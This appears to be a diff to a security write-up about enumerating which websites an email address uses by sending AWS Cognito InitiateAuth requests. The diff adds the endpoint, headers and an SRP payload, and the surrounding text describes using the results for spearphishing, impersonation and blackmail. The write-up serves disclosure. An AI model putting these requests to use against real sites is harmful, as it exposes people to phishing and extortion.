@@ -31,3 +31,34 @@ Easier, I can pretend to be a debt collector going after a small debt that's abo
 With a collection of `clientId`s, a threat actor could quickly see what websites an email address is associated with. 
 
 With this, I can easily spearphishing campaign, or blackmail campaign depending on what I discover.
+
+## How Does It Work?
+
+Make as many rest requests as you want, as quick as you want with the following format:
+
+### URL
+`"https://cognito-idp.us-east-2.amazonaws.com/`
+
+n.b. this might have to change depending on how the site set everything up
+
+### Headers
+```json
+{
+    "X-Amz-Target": "AWSCognitoIdentityProviderService.InitiateAuth",
+    "X-Amz-User-Agent": "aws-amplify/5.0.4 js",
+    "Content-Type": "application/x-amz-json-1.1"
+}
+```
+
+### Payload
+```json
+{
+  "AuthFlow": "USER_SRP_AUTH",
+  "ClientId": "5b6a*****umldkr",
+  "AuthParameters": {
+    "USERNAME": "hi@mom.com",
+    "SRP_A": "66463ad244621e5365841583e54891c292b3be74a00bdd034c2d555cf4fe1faaa"
+  },
+  "ClientMetadata": {}
+}
+```
